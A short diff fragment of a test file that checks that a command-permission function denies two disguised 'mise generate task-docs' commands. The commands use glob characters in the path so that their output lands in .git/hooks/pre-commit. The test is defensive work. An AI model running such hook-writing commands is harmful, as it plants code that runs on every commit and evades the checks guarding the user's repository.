+    "mise generate task-docs -o .g?t/hooks/pre-commit",
+    "mise generate task-docs --output=.git/hook[s]/pre-commit",
+  ])("%s", async (command) => {
+    expect(await decide(command)).toBe("deny");
+  });
+});
